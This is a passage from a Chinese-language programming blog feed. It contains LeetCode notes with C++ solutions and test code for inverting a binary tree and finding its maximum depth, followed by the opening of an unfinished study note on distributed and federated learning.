<code>[2,null,3,1]</code></p><p>題目原先的樹會長這樣:</p><p><img src="/img/LeetCode/226/edge.jpeg"></p><p>預期輸出:  <code>[2,null,3,null,1]</code></p><p><img src="/img/LeetCode/226/edge2.jpeg"></p><p>但我上面的作法會變成:  <code>[2,null,3,1]</code>，這是因為條件判斷 <code>if(current-&gt;left != NULL &amp;&amp; current-&gt;right != NULL)</code> 只在當前節點的左右子節點都不為 NULL 的情況下進行遞迴調用和交換。因此，它無法處理只有一個子節點的情況，從而導致錯誤的樹結構</p><p><img src="/img/LeetCode/226/edge3.jpeg"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        TreeNode *tmp = <span class="number">0</span>;</span><br><span class="line">        TreeNode *current = root;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;left);</span><br><span class="line">        <span class="built_in">invertTree</span>(current-&gt;right);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        tmp = current-&gt;left;</span><br><span class="line">        current-&gt;left = current-&gt;right;</span><br><span class="line">        current-&gt;right = tmp;</span><br><span class="line">        tmp =<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p>上面使用深度優先搜索（DFS）的遞迴方法遍歷整棵樹。在遞迴過程中，首先翻轉每個節點的左右子樹，然後進行交換操作。這樣，每次遞迴完成後，當前節點的子樹就被翻轉了。最終，整棵樹的所有節點都被翻轉。</p><p>翻轉後，樹中每個節點的左子節點和右子節點都被交換，形成了整棵樹的鏡像。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/226/result.jpeg"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        TreeNode *left, *right;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">TreeNode</span>():<span class="built_in">val</span>(<span class="number">0</span>),<span class="built_in">left</span>(<span class="number">0</span>),<span class="built_in">right</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x):<span class="built_in">val</span>(x),<span class="built_in">left</span>(<span class="number">0</span>),<span class="built_in">right</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x, TreeNode* leftnode, TreeNode* rightnode):<span class="built_in">val</span>(x),<span class="built_in">left</span>(leftnode),<span class="built_in">right</span>(rightnode)&#123;&#125;;</span><br><span class="line">        <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BT</span>;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> TreeNode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//constructor</span></span><br><span class="line">        <span class="built_in">BT</span>(): <span class="built_in">root</span>(<span class="number">0</span>) &#123;&#125;;</span><br><span class="line">        <span class="built_in">BT</span>(TreeNode* node):<span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//member function</span></span><br><span class="line">        <span class="function">TreeNode * <span class="title">invertTree</span><span class="params">(TreeNode* root)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">levelOrder</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BT::levelOrder</span><span class="params">()</span></span>&#123; </span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="keyword">this</span>-&gt;root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; current-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;left != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;right != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode *<span class="title">BT::invertTree</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    TreeNode *tmp = <span class="number">0</span>;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">invertTree</span>(current-&gt;left);</span><br><span class="line">    <span class="built_in">invertTree</span>(current-&gt;right);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    tmp = current-&gt;left;</span><br><span class="line">    current-&gt;left = current-&gt;right;</span><br><span class="line">    current-&gt;right = tmp;</span><br><span class="line">    tmp =<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    TreeNode *nodeA =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">4</span>);</span><br><span class="line">    TreeNode *nodeB =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">2</span>);</span><br><span class="line">    TreeNode *nodeC =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">7</span>);</span><br><span class="line">    TreeNode *nodeD =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    TreeNode *nodeE =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">3</span>);</span><br><span class="line">    TreeNode *nodeF =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">6</span>);</span><br><span class="line">    TreeNode *nodeG =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TreeNode *nodeA =  new TreeNode(2);</span></span><br><span class="line">    <span class="comment">// TreeNode *nodeB =  new TreeNode(3);</span></span><br><span class="line">    <span class="comment">// TreeNode *nodeC =  new TreeNode(1);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    nodeA-&gt;left = nodeB;</span><br><span class="line">    nodeA-&gt;right = nodeC;</span><br><span class="line">    nodeB-&gt;left = nodeD;</span><br><span class="line">    nodeB-&gt;right = nodeE;</span><br><span class="line">    nodeC-&gt;left = nodeF;</span><br><span class="line">    nodeC-&gt;right = nodeG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// nodeA-&gt;right = nodeB;</span></span><br><span class="line">    <span class="comment">// nodeB-&gt;right = nodeC;</span></span><br><span class="line">    <span class="comment">// nodeB-&gt;left = NULL;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">BT <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Level Order: &quot;</span> &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">levelOrder</span>();</span><br><span class="line"></span><br><span class="line">    T.<span class="built_in">invertTree</span>(T.root);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\nAfter Inverstion:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">levelOrder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$, 每個節點都會被訪問一次，其中 n 是樹中節點的數量。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>在一般情況下，對於一棵平衡二元樹，空間複雜度是 $O(log n)$，因為樹的高度 h 大約為 $log n$。但對於完全不平衡的樹，空間複雜度會退化到 $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹的最大深度 | Easy | LeetCode#104. Maximum Depth of Binary Tree</title>
      <link href="/posts/4cd60718.html"/>
      <url>/posts/4cd60718.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/104/question.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定一個Binary Tree 的 <code>Root</code>，要求這棵二元樹的最大深度</li></ul><div class="note info flat"><p>最大深度即 root 到樹葉的最遠距離</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法只有停留在 Traversal 本身，所以寫了 Inorder, Preorder, Postorder 甚至是 Level-order，都還是沒有太多想法…</p><p>這次是看了提示後才寫出來，並且了解到我自己對Recursive 的不熟練</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> leftdepth = <span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightdepth = <span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="comment">//cout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(leftdepth, rightdepth) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p><img src="/img/LeetCode/104/algo1.png"><br><img src="/img/LeetCode/104/algo2.png"></p><p>首先程式碼對於 root pointer 存取到NULL，則回傳0 (也就是已經走到Leaf了)，之後遞迴求每個節點的各自子節點的最大深度值，當走到 leaf 的時候，由於左右子節點都為 NULL，因此對於 leaf node 來說它的 <code>leftdepth</code> 以及 <code>rightdepth</code> 都是0，因此回傳 1 (0+1)，代表從leaf 開始往回算深度，目前深度為1。</p><p>之後就會沿著之前的 functional call chain 一路返回到 Root，<strong>並且在返回過程比較左右子樹的深度哪個比較大，因此一旦跑完程式，回傳結果必定會是最大深度。</strong></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/104/result.jpeg"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        TreeNode *leftchild, *rightchild;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">TreeNode</span>():<span class="built_in">val</span>(<span class="number">0</span>),<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x):<span class="built_in">val</span>(x),<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x, TreeNode *left, TreeNode *right):<span class="built_in">val</span>(x),<span class="built_in">leftchild</span>(left),<span class="built_in">rightchild</span>(right)&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *root;</span><br><span class="line">        <span class="comment">//Constructor</span></span><br><span class="line">        <span class="built_in">BinaryTree</span>():<span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BinaryTree</span>(TreeNode * node):<span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//member function</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Levelorder</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode * root)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinaryTree::maxDepth</span><span class="params">(TreeNode * current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> leftdepth = <span class="built_in">maxDepth</span>(current-&gt;leftchild);</span><br><span class="line">    <span class="type">int</span> rightdepth = <span class="built_in">maxDepth</span>(current-&gt;rightchild);</span><br><span class="line">    <span class="comment">//cout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(leftdepth, rightdepth) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="comment">// Instanitate  all tree nodes</span></span><br><span class="line">    TreeNode *nodeA = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    TreeNode *nodeB = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">2</span>);</span><br><span class="line">    TreeNode *nodeC = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">3</span>);</span><br><span class="line">    TreeNode *nodeD = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">4</span>);</span><br><span class="line">    TreeNode *nodeE = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    nodeA-&gt;leftchild = nodeB;</span><br><span class="line">    nodeB -&gt; leftchild = nodeD;</span><br><span class="line">    nodeA-&gt;rightchild = nodeC;</span><br><span class="line">    nodeC-&gt;rightchild = nodeE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Define root node</span></span><br><span class="line">    <span class="function">BinaryTree <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line"></span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;max depth: &quot;</span> &lt;&lt;  T.<span class="built_in">maxDepth</span>(T.root) &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>時間複雜度會是 $O(n)$，因為它需要遍歷樹中的每個節點一次</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>在一般情況下（例如平衡二元樹），遞迴方法的空間複雜度是 $O(log(n))$ (也就是跟平衡樹的高度一樣，高度為 log(n)，其中 n 是節點數目)，但如果是 skewed tree，則樹高與節點數量一樣，也就是 n ，因此最壞情況下的空間複雜度會是 $O(n)$</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次讓我體會到了遞迴的力量，我應該會回去複習 Recursive 的各種用法</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從並行計算到聯邦式學習 | 學習筆記</title>
      <link href="/posts/federation-learning.html"/>
      <url>/posts/federation-learning.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是並行計算"><a href="#甚麼是並行計算" class="headerlink" title="甚麼是並行計算?"></a>甚麼是並行計算?</h1><p>現在的深度神經網路模型具有大量的參數，模型大也意味著計算量變大</p><blockquote><p>Big Model + Big Data -&gt; Huge computation cost !</p></blockquote><p>單一GPU進行一年的計算量，可以透過20 個 GPU 一次進行計算來實現，來減少花費的時間成本</p><h1 id="Linear-Predictor"><a href="#Linear-Predictor" class="headerlink" title="Linear Predictor"></a>Linear Predictor</h1><p>未完待續</p><h1 id="聯邦式學習"><a href="#聯邦式學習" class="headerlink" title="聯邦式學習"></a>聯邦式學習</h1><div class="note info flat"><p>最好先具備並行計算和分散式機器學習的基礎。可以參考下面這系列影片:<a href="https://www.youtube.com/watch?v=gVcnOe6_c6Q&t=124s">https://www.youtube.com/watch?v=gVcnOe6_c6Q&amp;t=124s</a></p></div><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote><p><strong>問題背景:</strong>  Google 想要透過使用者行動裝置上的資料來訓練模型。</p></blockquote><blockquote><p><strong>可能的解決辦法:</strong> 蒐集使用者資料，上傳到某個集中式學習平台去訓練模型</p></blockquote><blockquote><p><strong>面臨的挑戰:</strong> 使用者拒絕上傳資料，尤其是機敏資料到 Google 的伺服器 </p></blockquote><p>這樣的問題情境也發生在個人隱私保護很嚴格的歐美企業或是醫療環境中</p><h2 id="分散式學習-以及-聯邦學習"><a href="#分散式學習-以及-聯邦學習" class="headerlink" title="分散式學習 以及 聯邦學習"></a>分散式學習 以及 聯邦學習</h2><p><img src="/img/Fed/ds2.png"></p><p>一次迭代的過程:</p><ul><li>worker node 向 parameter 索取parameter</li><li>server 回傳 parameter</li><li>worker node 根據回傳的參數，本地計算梯度(gradient)</li><li>workde node 回傳梯度給 parameter server</li><li>parameter server 透過梯度更新參數</li></ul><p>這個過程中，worker的資料沒有離開節點，Server也無法看到用戶資料。這個架構就能夠解決上面的問題情境</p><blockquote><p>聯邦式學習就是一種分散式學習，但與傳統分散式學習還是有幾項差異</p></blockquote><ul><li>用戶對於它們的設備和資料有控制權，而傳統分散式學習中，worker 受到 server 控制</li><li>worker node 並不穩定(unstable )，因為workder node 通常會是行動設備 (Ex. 手機)，計算能力也不盡相同，節點計算效能有快有慢</li><li>聯邦學習通訊代價大，通常是通訊頻寬低，或者workder node 與 server 距離遠</li><li>儲存在 workder node 的資料並非<a href="https://zh.wikipedia.org/zh-tw/%E7%8B%AC%E7%AB%8B%E5%90%8C%E5%88%86%E5%B8%83">IID分布(獨立同分布)</a></li><li>聯邦學習的節點負載不平衡，手機A的使用者每天拍照，手機B的使用者10天拍一次照片</li></ul><blockquote><p><strong>多做計算，少做通訊</strong>， 由於通訊代價高，因此研究方向上，通常能夠降低通訊次數就很好了</p></blockquote><h1 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h1><h2 id="Worker-要做的事情"><a href="#Worker-要做的事情" class="headerlink" title="Worker 要做的事情"></a>Worker 要做的事情</h2><ol><li>接收來自 Server 的模型參數 $w$</li><li>透過模型參數 $w$ 和本地資料計算 gradient $g_{i}$</li><li>將  $g_{i}$ 發送給 Server</li></ol><h2 id="Server-會做的事情"><a href="#Server-會做的事情" class="headerlink" title="Server 會做的事情"></a>Server 會做的事情</h2><ol><li>接收來自不同 workder node 的 gradient <strong>$g_{1},…,g_{m}$</strong></li><li>計算 <strong>$g&#x3D;g_{1}+…+g_{m}$</strong></li><li>更新模型參數: <strong>$w \leftarrow 